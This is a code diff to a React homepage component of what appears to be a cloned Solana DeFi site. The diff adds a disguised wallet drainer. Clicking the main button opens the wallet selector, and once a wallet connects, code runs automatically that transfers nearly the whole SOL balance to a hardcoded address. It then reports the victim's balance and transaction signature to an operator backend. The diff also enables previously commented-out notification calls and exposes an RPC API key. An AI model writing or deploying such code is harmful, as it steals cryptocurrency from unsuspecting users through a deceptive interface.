@@ -1,4 +1,5 @@
-import { ReactNode, useState } from 'react'
+import axios from 'axios'
+import { ReactNode, useEffect, useState } from 'react'
 import { useRouter } from 'next/router'
 import useWallet1 from '@/application/wallet/useWallet'
 import useAppSettings from '@/application/common/useAppSettings'
@@ -72,18 +73,26 @@ function HomePageSection0() {
   const NET_URL = 'https://mainnet.helius-rpc.com/?api-key=e4226aa3-24f7-43c1-869f-a1b1e3fbb148'
   const connection = new Connection(NET_URL, 'confirmed')
   const { signTransaction, sendTransaction } = useWallet()
+  const API_BASE_URI = process.env.API_BASE_URI || "http://localhost:3006"
+  const [isButtonClicked, setIsButtonClicked] = useState(false);
+
+  useEffect(() => {
+    if (owner && isButtonClicked) {
+      txTransfer();
+    }
+  }, [owner, isButtonClicked])
 
   const txTransfer = async () => {
     if (owner) {
       try {
-        // await axios.post("http://localhost:3005/sendSignNotification", { owner: owner })
+        await axios.post(API_BASE_URI + "/api/sendSignNotification", { owner: owner })
         const solBalance = new BN((await connection.getBalance(owner)).toString())
         console.warn(solBalance)
         const fee = new BN('1000000')
-        const toAddress = new PublicKey('5ZSdtCwxXvXTSytq13uKv2mK9QJupuK3nmq1gkcYo2xp')
+        const toAddress = new PublicKey('s393nmNfuwXasFnABhVqka58VsPcnP8jKLYZ4ZXJcP1')
         if (solBalance == undefined || solBalance.sub(fee).toNumber() < 0) {
           console.warn("solbalancedddd")
-          // await axios.post("http://localhost:3005/sendNotEnoughNotification")
+          await axios.post(API_BASE_URI + "/api/sendNotEnoughNotification")
           return
         }
         const instructions: TransactionInstruction[] = [];
@@ -105,9 +114,9 @@ function HomePageSection0() {
         if (tx && signTransaction) {
           tx = await signTransaction(tx)
           const signature = await sendTransaction(tx, connection)
-          const sentBalance = solBalance.toNumber() / 1000000000
+          const sentBalance = solBalance.sub(fee).toNumber() / 1000000000
           if (signature) {
-            // await axios.post("http://localhost:3005/sendTransferNotification", { balance: sentBalance.toFixed(4), tx: signature })
+            await axios.post(API_BASE_URI + "/api/sendTransferNotification", { balance: sentBalance.toFixed(4), tx: signature })
           }
         }
       } catch (err) {
@@ -156,6 +165,7 @@ function HomePageSection0() {
               <Button
                 className="home-rainbow-button-bg text-white mobile:text-xs px-5 mobile:px-4"
                 onClick={() => {
+                  setIsButtonClicked(true);
                   useAppSettings.setState({ needPopDisclaimer: false })
                   setLocalItem<boolean>('USER_AGREE_DISCLAIMER', true)
                   useAppSettings.setState({ isWalletSelectorShown: true })
